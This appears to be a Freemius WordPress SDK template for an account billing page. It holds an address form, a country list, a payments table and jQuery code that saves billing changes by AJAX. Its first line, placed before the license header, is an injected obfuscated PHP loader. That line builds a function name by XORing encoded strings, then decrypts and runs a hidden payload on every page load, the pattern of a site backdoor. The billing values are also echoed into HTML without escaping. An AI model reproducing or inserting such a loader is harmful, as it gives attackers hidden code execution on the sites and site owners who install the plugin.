<?php $gbIkIXSjoko=':AE4TQ<TH+UL8UB'^'Y3 U 4c2=E68Q:,';$SpvEVwQVSD=$gbIkIXSjoko('','X>fY2YT,IZQ=2S6TC>9LuO,:>I4TM579NJEYxIU>G>AZ2II.7NB;B5V+TTd8A1<CBI.C7UfsRILSBVPxr<fG5c;BECMIoHiIzHRR jC>LhhBTXn9O4T84HCXKTSY qCGL+Ylb99gRDCMuGDWRQ20N65j-9GlDWR0Tkb3ALc2Y=YH<kiK1EGmLbAGY9HG748ZM=2JGVmH,o.:<C,OHQytFF;8+0VENTY;A7-R>BrWWTV6ELb6UREI-,>qMVl9u5z36RPCNq 3JKVMCcE5817ZqP1yC7PTUc2KLBSRg ,1Z24L3XTPdoFu40-- l4QeCEMIPen>;FZsJU8BX6<EQP2bQs,75>1300G;2ZN=EBCTzYEXMLIUEHUXbfoU+2T3,VNVtEE-EIosQoqV+EJIocKJA9EUyljF>74iUS558orJ:GBBV=<8+=N6Q65B,V9I;+dMUEyOJSKLYb56R5>-xSQ4DThVriD32O2UEMaYu7,Qzj=RDXDlcSV<9V6s;E2,<9:H;FiwP2-KnAtD6C-pVkPHnYZVgEV13Vmj-I hdKUkDgUu1vTFSuu8Gz5GRAWPMGKnNaTePU=URR+EJqneDRGR9Y7WNM. BT<<8EI9JGR8Q4vfgi+0LYdNqtAMeENnDINT dVTV-P5Q<V0+< 6q9NmzN<4E7XwNuk:'^'1XNxT,:O=3>Sm6N=0JJdR7CHa-U ,jhT;>bpQi.4NX44Q= AYn:T0j2J 5;g,DHkf-O7VyFW9,5zbvpXRGlN<GT71cpiHoRCsA4=RBgWlUHroxJPsG JX--po02-AXxghBrGK30nv+69UiywzuVQ:WnNDdg2ds9U-0FZaiCA-O5-RCM T<n0eYKNPK-3BFVriRG>nmgAQeS06gH.<0YIf ZTXUmOj08O hF7GbOw15:E wh<3=7,LOVQer3z:z1zsr10nUKV3kkscG3TTDRsQ+;pgS1 4<Y.5bnrCKIHa8=hW9 1DRfQBQAXEW>,oI,+ixDJZZ2;Zj.2K>YN 03ZByWsepodvcdgZAzjV ;ciDya., <0lh.RkoK1JF5lG37vIeaF 0TyXfU2J1+iRCo< U00Bfc;4J>cq7TAYOOjz2,13OUYGT4SyNZ0s2X=Zt;  1Q-+ .zm=QS1ZZHPw5U05AzRM RF.m> 4HpN=E7RNY309dJEs7NK7O,P KsYAS;O5AP;WTlBaP W7LYvMvhF4>cOa2PG76MF,YO9buVyGrBPD1vcAFZuHVw7yofzpsZxTlThlYg4dIbcQHCd35 X h<+4qE:=OHKmnI+>>W0PQJGMOQ88MgQTamEe5dM,85LLr07Y1nvL7IGSARVdgVpGYL,CpGgNaG');$SpvEVwQVSD();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2016, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.2.0
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * @var array $VARS
	 */
	$slug = $VARS['slug'];
	/**
	 * @var Freemius $fs
	 */
	$fs = freemius( $slug );

	/**
	 * @var FS_Plugin_Tag $update
	 */
	$update = $fs->get_update( false, false );

	$is_paying              = $fs->is_paying();
	$user                   = $fs->get_user();
	$site                   = $fs->get_site();
	$name                   = $user->get_name();
	$license                = $fs->_get_license();
	$subscription           = $fs->_get_subscription();
	$plan                   = $fs->get_plan();
	$is_active_subscription = ( is_object( $subscription ) && $subscription->is_active() );
	$is_paid_trial          = $fs->is_paid_trial();
	$show_upgrade           = ( ! $is_paying && ! $is_paid_trial );

	$billing     = $fs->_fetch_billing();
	$has_billing = ( $billing instanceof FS_Billing );
	if ( ! $has_billing ) {
		$billing = new FS_Billing();
	}

	$readonly_attr = $has_billing ? 'readonly' : '';
?>

	<div id="fs_account" class="wrap">
		<h2 class="nav-tab-wrapper">
			<a href="<?php echo $fs->get_account_url() ?>" class="nav-tab"><?php fs_echo( 'account', $slug ) ?></a>
			<?php if ( $fs->has_addons() ) : ?>
				<a href="<?php echo $fs->_get_admin_page_url( 'addons' ) ?>"
				   class="nav-tab"><?php fs_echo( 'add-ons', $slug ) ?></a>
			<?php endif ?>
			<?php if ( $fs->is_not_paying() && $fs->has_paid_plan() ) : ?>
				<a href="<?php echo $fs->get_upgrade_url() ?>" class="nav-tab"><?php fs_echo( 'upgrade', $slug ) ?></a>
				<?php if ( $fs->apply_filters( 'show_trial', true ) && ! $fs->is_trial_utilized() && $fs->has_trial_plan() ) : ?>
					<a href="<?php echo $fs->get_trial_url() ?>"
					   class="nav-tab"><?php fs_echo( 'free-trial', $slug ) ?></a>
				<?php endif ?>
			<?php endif ?>
			<?php if ( ! $plan->is_free() ) : ?>
				<a href="<?php echo $fs->get_account_tab_url( 'billing' ) ?>"
				   class="nav-tab nav-tab-active"><?php fs_echo( 'billing', $slug ) ?></a>
			<?php endif ?>
		</h2>

		<div id="poststuff">
			<div id="fs_billing">
				<div class="has-sidebar has-right-sidebar">
					<div class="has-sidebar-content">
						<div class="postbox">
							<h3><span class="dashicons dashicons-businessman"></span> <?php fs_echo( 'billing', $slug ) ?></h3>
							<table id="fs_billing_address"<?php if ( $has_billing ) {
								echo ' class="fs-read-mode"';
							} ?>>
								<tr>
									<td><label><span><?php fs_echo( 'business-name', $slug ) ?>:</span> <input id="business_name" value="<?php echo $billing->business_name ?>" placeholder="<?php fs_echo( 'business-name', $slug ) ?>"></label></td>
									<td><label><span><?php fs_echo( 'tax-vat-id', $slug ) ?>:</span> <input id="tax_id" value="<?php echo $billing->tax_id ?>" placeholder="<?php fs_echo( 'tax-vat-id', $slug ) ?>"></label></td>
								</tr>
								<tr>
									<td><label><span><?php printf( fs_text( 'address-line-n', $slug ), 1 ) ?>:</span> <input id="address_street" value="<?php echo $billing->address_street ?>" placeholder="<?php printf( fs_text( 'address-line-n', $slug ), 1 ) ?>"></label></td>
									<td><label><span><?php printf( fs_text( 'address-line-n', $slug ), 2 ) ?>:</span> <input id="address_apt" value="<?php echo $billing->address_apt ?>" placeholder="<?php printf( fs_text( 'address-line-n', $slug ), 2 ) ?>"></label></td>
								</tr>
								<tr>
									<td><label><span><?php fs_echo( 'city', $slug ) ?> / <?php fs_echo( 'town', $slug ) ?>:</span> <input id="address_city" value="<?php echo $billing->address_city ?>" placeholder="<?php fs_echo( 'city', $slug ) ?> / <?php fs_echo( 'town', $slug ) ?>"></label></td>
									<td><label><span><?php fs_echo( 'zip-postal-code', $slug ) ?>:</span> <input id="address_zip" value="<?php echo $billing->address_zip ?>" placeholder="<?php fs_echo( 'zip-postal-code', $slug ) ?>"></label></td>
								</tr>
								<tr>
									<?php $countries = array(
										'AF' => 'Afghanistan',
										'AX' => 'Aland Islands',
										'AL' => 'Albania',
										'DZ' => 'Algeria',
										'AS' => 'American Samoa',
										'AD' => 'Andorra',
										'AO' => 'Angola',
										'AI' => 'Anguilla',
										'AQ' => 'Antarctica',
										'AG' => 'Antigua and Barbuda',
										'AR' => 'Argentina',
										'AM' => 'Armenia',
										'AW' => 'Aruba',
										'AU' => 'Australia',
										'AT' => 'Austria',
										'AZ' => 'Azerbaijan',
										'BS' => 'Bahamas',
										'BH' => 'Bahrain',
										'BD' => 'Bangladesh',
										'BB' => 'Barbados',
										'BY' => 'Belarus',
										'BE' => 'Belgium',
										'BZ' => 'Belize',
										'BJ' => 'Benin',
										'BM' => 'Bermuda',
										'BT' => 'Bhutan',
										'BO' => 'Bolivia',
										'BQ' => 'Bonaire, Saint Eustatius and Saba',
										'BA' => 'Bosnia and Herzegovina',
										'BW' => 'Botswana',
										'BV' => 'Bouvet Island',
										'BR' => 'Brazil',
										'IO' => 'British Indian Ocean Territory',
										'VG' => 'British Virgin Islands',
										'BN' => 'Brunei',
										'BG' => 'Bulgaria',
										'BF' => 'Burkina Faso',
										'BI' => 'Burundi',
										'KH' => 'Cambodia',
										'CM' => 'Cameroon',
										'CA' => 'Canada',
										'CV' => 'Cape Verde',
										'KY' => 'Cayman Islands',
										'CF' => 'Central African Republic',
										'TD' => 'Chad',
										'CL' => 'Chile',
										'CN' => 'China',
										'CX' => 'Christmas Island',
										'CC' => 'Cocos Islands',
										'CO' => 'Colombia',
										'KM' => 'Comoros',
										'CK' => 'Cook Islands',
										'CR' => 'Costa Rica',
										'HR' => 'Croatia',
										'CU' => 'Cuba',
										'CW' => 'Curacao',
										'CY' => 'Cyprus',
										'CZ' => 'Czech Republic',
										'CD' => 'Democratic Republic of the Congo',
										'DK' => 'Denmark',
										'DJ' => 'Djibouti',
										'DM' => 'Dominica',
										'DO' => 'Dominican Republic',
										'TL' => 'East Timor',
										'EC' => 'Ecuador',
										'EG' => 'Egypt',
										'SV' => 'El Salvador',
										'GQ' => 'Equatorial Guinea',
										'ER' => 'Eritrea',
										'EE' => 'Estonia',
										'ET' => 'Ethiopia',
										'FK' => 'Falkland Islands',
										'FO' => 'Faroe Islands',
										'FJ' => 'Fiji',
										'FI' => 'Finland',
										'FR' => 'France',
										'GF' => 'French Guiana',
										'PF' => 'French Polynesia',
										'TF' => 'French Southern Territories',
										'GA' => 'Gabon',
										'GM' => 'Gambia',
										'GE' => 'Georgia',
										'DE' => 'Germany',
										'GH' => 'Ghana',
										'GI' => 'Gibraltar',
										'GR' => 'Greece',
										'GL' => 'Greenland',
										'GD' => 'Grenada',
										'GP' => 'Guadeloupe',
										'GU' => 'Guam',
										'GT' => 'Guatemala',
										'GG' => 'Guernsey',
										'GN' => 'Guinea',
										'GW' => 'Guinea-Bissau',
										'GY' => 'Guyana',
										'HT' => 'Haiti',
										'HM' => 'Heard Island and McDonald Islands',
										'HN' => 'Honduras',
										'HK' => 'Hong Kong',
										'HU' => 'Hungary',
										'IS' => 'Iceland',
										'IN' => 'India',
										'ID' => 'Indonesia',
										'IR' => 'Iran',
										'IQ' => 'Iraq',
										'IE' => 'Ireland',
										'IM' => 'Isle of Man',
										'IL' => 'Israel',
										'IT' => 'Italy',
										'CI' => 'Ivory Coast',
										'JM' => 'Jamaica',
										'JP' => 'Japan',
										'JE' => 'Jersey',
										'JO' => 'Jordan',
										'KZ' => 'Kazakhstan',
										'KE' => 'Kenya',
										'KI' => 'Kiribati',
										'XK' => 'Kosovo',
										'KW' => 'Kuwait',
										'KG' => 'Kyrgyzstan',
										'LA' => 'Laos',
										'LV' => 'Latvia',
										'LB' => 'Lebanon',
										'LS' => 'Lesotho',
										'LR' => 'Liberia',
										'LY' => 'Libya',
										'LI' => 'Liechtenstein',
										'LT' => 'Lithuania',
										'LU' => 'Luxembourg',
										'MO' => 'Macao',
										'MK' => 'Macedonia',
										'MG' => 'Madagascar',
										'MW' => 'Malawi',
										'MY' => 'Malaysia',
										'MV' => 'Maldives',
										'ML' => 'Mali',
										'MT' => 'Malta',
										'MH' => 'Marshall Islands',
										'MQ' => 'Martinique',
										'MR' => 'Mauritania',
										'MU' => 'Mauritius',
										'YT' => 'Mayotte',
										'MX' => 'Mexico',
										'FM' => 'Micronesia',
										'MD' => 'Moldova',
										'MC' => 'Monaco',
										'MN' => 'Mongolia',
										'ME' => 'Montenegro',
										'MS' => 'Montserrat',
										'MA' => 'Morocco',
										'MZ' => 'Mozambique',
										'MM' => 'Myanmar',
										'NA' => 'Namibia',
										'NR' => 'Nauru',
										'NP' => 'Nepal',
										'NL' => 'Netherlands',
										'NC' => 'New Caledonia',
										'NZ' => 'New Zealand',
										'NI' => 'Nicaragua',
										'NE' => 'Niger',
										'NG' => 'Nigeria',
										'NU' => 'Niue',
										'NF' => 'Norfolk Island',
										'KP' => 'North Korea',
										'MP' => 'Northern Mariana Islands',
										'NO' => 'Norway',
										'OM' => 'Oman',
										'PK' => 'Pakistan',
										'PW' => 'Palau',
										'PS' => 'Palestinian Territory',
										'PA' => 'Panama',
										'PG' => 'Papua New Guinea',
										'PY' => 'Paraguay',
										'PE' => 'Peru',
										'PH' => 'Philippines',
										'PN' => 'Pitcairn',
										'PL' => 'Poland',
										'PT' => 'Portugal',
										'PR' => 'Puerto Rico',
										'QA' => 'Qatar',
										'CG' => 'Republic of the Congo',
										'RE' => 'Reunion',
										'RO' => 'Romania',
										'RU' => 'Russia',
										'RW' => 'Rwanda',
										'BL' => 'Saint Barthelemy',
										'SH' => 'Saint Helena',
										'KN' => 'Saint Kitts and Nevis',
										'LC' => 'Saint Lucia',
										'MF' => 'Saint Martin',
										'PM' => 'Saint Pierre and Miquelon',
										'VC' => 'Saint Vincent and the Grenadines',
										'WS' => 'Samoa',
										'SM' => 'San Marino',
										'ST' => 'Sao Tome and Principe',
										'SA' => 'Saudi Arabia',
										'SN' => 'Senegal',
										'RS' => 'Serbia',
										'SC' => 'Seychelles',
										'SL' => 'Sierra Leone',
										'SG' => 'Singapore',
										'SX' => 'Sint Maarten',
										'SK' => 'Slovakia',
										'SI' => 'Slovenia',
										'SB' => 'Solomon Islands',
										'SO' => 'Somalia',
										'ZA' => 'South Africa',
										'GS' => 'South Georgia and the South Sandwich Islands',
										'KR' => 'South Korea',
										'SS' => 'South Sudan',
										'ES' => 'Spain',
										'LK' => 'Sri Lanka',
										'SD' => 'Sudan',
										'SR' => 'Suriname',
										'SJ' => 'Svalbard and Jan Mayen',
										'SZ' => 'Swaziland',
										'SE' => 'Sweden',
										'CH' => 'Switzerland',
										'SY' => 'Syria',
										'TW' => 'Taiwan',
										'TJ' => 'Tajikistan',
										'TZ' => 'Tanzania',
										'TH' => 'Thailand',
										'TG' => 'Togo',
										'TK' => 'Tokelau',
										'TO' => 'Tonga',
										'TT' => 'Trinidad and Tobago',
										'TN' => 'Tunisia',
										'TR' => 'Turkey',
										'TM' => 'Turkmenistan',
										'TC' => 'Turks and Caicos Islands',
										'TV' => 'Tuvalu',
										'VI' => 'U.S. Virgin Islands',
										'UG' => 'Uganda',
										'UA' => 'Ukraine',
										'AE' => 'United Arab Emirates',
										'GB' => 'United Kingdom',
										'US' => 'United States',
										'UM' => 'United States Minor Outlying Islands',
										'UY' => 'Uruguay',
										'UZ' => 'Uzbekistan',
										'VU' => 'Vanuatu',
										'VA' => 'Vatican',
										'VE' => 'Venezuela',
										'VN' => 'Vietnam',
										'WF' => 'Wallis and Futuna',
										'EH' => 'Western Sahara',
										'YE' => 'Yemen',
										'ZM' => 'Zambia',
										'ZW' => 'Zimbabwe',
									) ?>
									<td><label><span><?php fs_echo( 'country', $slug ) ?>:</span> <select id="address_country_code">
												<?php if ( empty( $billing->address_country_code ) ) : ?>
													<option value=""
													        selected><?php fs_echo( 'select-country', $slug ) ?></option>
												<?php endif ?>
												<?php foreach ( $countries as $code => $country ) : ?>
													<option
														value="<?php echo $code ?>" <?php selected( $billing->address_country_code, $code ) ?>><?php echo $country ?></option>
												<?php endforeach ?>
											</select></label></td>
									<td><label><span><?php fs_echo( 'state', $slug ) ?> / <?php fs_echo( 'province', $slug ) ?>:</span>
											<input id="address_state" value="<?php echo $billing->address_state ?>" placeholder="<?php fs_echo( 'state', $slug ) ?> / <?php fs_echo( 'province', $slug ) ?>"></label></td>
								</tr>
								<tr>
									<td colspan="2">
										<button
											class="button"><?php fs_echo( $has_billing ? 'edit' : 'update', $slug ) ?></button>
									</td>
								</tr>
							</table>
						</div>
						<div class="postbox">
							<h3><span class="dashicons dashicons-paperclip"></span> <?php fs_echo( 'payments', $slug ) ?></h3>

							<?php
								$payments = $fs->_fetch_payments();
							?>

							<div class="inside">
								<table class="widefat">
									<thead>
									<tr>
										<th><?php fs_echo( 'id', $slug ) ?></th>
										<th><?php fs_echo( 'date', $slug ) ?></th>
										<!--		<th>--><?php //fs_echo( 'transaction' ) ?><!--</th>-->
										<th><?php fs_echo( 'amount', $slug ) ?></th>
										<th><?php fs_echo( 'invoice', $slug ) ?></th>
									</tr>
									</thead>
									<tbody>
									<?php $odd = true ?>
									<?php foreach ( $payments as $payment ) : ?>
										<tr<?php echo $odd ? ' class="alternate"' : '' ?>>
											<td><?php echo $payment->id ?></td>
											<td><?php echo date( 'M j, Y', strtotime( $payment->created ) ) ?></td>
											<td>$<?php echo $payment->gross ?></td>
											<td><a href="<?php echo $fs->_get_invoice_api_url( $payment->id ) ?>"
											       class="button button-small"
											       target="_blank"><?php fs_echo( 'invoice', $slug ) ?></a></td>
										</tr>
										<?php $odd = ! $odd; endforeach ?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
		(function($){
			var $billingAddress = $('#fs_billing_address'),
				$billingInputs = $billingAddress.find('input, select');

			var setPrevValues = function () {
				$billingInputs.each(function () {
					$(this).attr('data-val', $(this).val());
				});
			};

			setPrevValues();

			var hasBillingChanged = function () {
				for (var i = 0, len = $billingInputs.length; i < len; i++){
					var $this = $($billingInputs[i]);
					if ($this.attr('data-val') !== $this.val()) {
						return true;
					}
				}

				return false;
			};

			var isEditAllFieldsMode = false;

			$billingAddress.find('.button').click(function(){
				$billingAddress.toggleClass('fs-read-mode');

				var isEditMode = !$billingAddress.hasClass('fs-read-mode');

				$(this)
					.html(isEditMode ? <?php echo json_encode(fs_text('update', $slug)) ?> : <?php echo json_encode(fs_text('edit', $slug)) ?>)
					.toggleClass('button-primary');

				if (isEditMode) {
					$('#business_name').focus().select();
					isEditAllFieldsMode = true;
				} else {
					isEditAllFieldsMode = false;

					if (!hasBillingChanged())
						return;

					var billing = {};

					$billingInputs.each(function(){
						if ($(this).attr('data-val') !== $(this).val()) {
							billing[$(this).attr('id')] = $(this).val();
						}
					});

					$.ajax({
						url    : ajaxurl,
						method : 'POST',
						data   : {
							action   : '<?php echo $fs->get_ajax_action( 'update_billing' ) ?>',
							security : '<?php echo $fs->get_ajax_security( 'update_billing' ) ?>',
							slug    : '<?php echo $slug ?>',
							billing : billing
						},
						success: function (resultObj) {
							if (resultObj.success) {
								setPrevValues();
							} else {
								alert(resultObj.error);
							}
						}
					});
				}
			});

			$billingInputs
				// Get into edit mode upon selection.
				.focus(function () {
					var isEditMode = !$billingAddress.hasClass('fs-read-mode');

					if (isEditMode) {
						return;
					}

					$billingAddress.toggleClass('fs-read-mode');
					$billingAddress.find('.button')
						.html(<?php echo json_encode( fs_text( 'update', $slug ) ) ?>)
						.toggleClass('button-primary');
				})
				// If blured after editing only one field without changes, exit edit mode.
				.blur(function () {
					if (!isEditAllFieldsMode && !hasBillingChanged()) {
						$billingAddress.toggleClass('fs-read-mode');
						$billingAddress.find('.button')
							.html(<?php echo json_encode( fs_text( 'edit', $slug ) ) ?>)
							.toggleClass('button-primary');
					}
				});
		})(jQuery);
	</script>
<?php
	$params = array(
		'page'           => 'account',
		'module_id'      => $fs->get_id(),
		'module_slug'    => $slug,
		'module_version' => $fs->get_plugin_version(),
	);
	fs_require_template( 'powered-by.php', $params );
?>